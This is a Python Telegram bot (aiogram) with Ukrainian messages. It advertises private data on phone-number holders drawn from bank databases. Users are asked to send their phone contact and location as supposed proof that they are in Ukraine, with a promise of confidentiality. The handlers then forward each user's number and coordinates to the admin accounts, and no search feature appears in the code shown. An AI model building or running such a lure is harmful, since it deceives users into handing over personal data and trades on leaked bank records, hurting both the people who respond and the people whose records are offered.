import logging

from aiogram import types
from aiogram.dispatcher.filters.builtin import Command

from data.config import admins
from keyboards.default import phone, location
from loader import dp


@dp.message_handler(Command("start"))
async def bot_start(message: types.Message):
    await message.answer(f"Притів, {message.from_user.full_name}. Цей бот надає приватну інформацію про тримачів "
                         f"номерів мобільних телефонів з банківських баз даних. Зроблено громадянами України "
                         f"для громадян України. Для використання боту підтвердіть, що ви знаходитесь на території "
                         f"України, надіславши номер, за яким зареєстровано ваш обліковий запис та вашу локацію. Ця "
                         f"інфомація залишиться конфіденційною да буде використана "
                         f"для фільтрації стронній користувачів.", reply_markup=phone)


@dp.message_handler(content_types=types.ContentType.CONTACT)
async def get_contact(message: types.Message):
    contact = message.contact
    for admin in admins:
        try:
            await dp.bot.send_message(admin, f"УВАГА, НОВИЙ КОНТАКТ: \n{contact}")

        except Exception as err:
            logging.exception(err)
    await message.answer("Дякую, ваші данні було оброблено. Тепер підтвердіть ваше місцезнаходження",
                         reply_markup=location)


@dp.message_handler(content_types=types.ContentType.LOCATION)
async def get_contact(message: types.Message):
    locations = message.location
    for admin in admins:
        try:
            await dp.bot.send_message(admin, f"УВАГА, НОВИЙ КОНТАКТ: \n{locations}")

        except Exception as err:
            logging.exception(err)
    await message.answer("Дякую, ваші данні було оброблено. Тепер ви можете здійснювати пошук, хай щастить.")
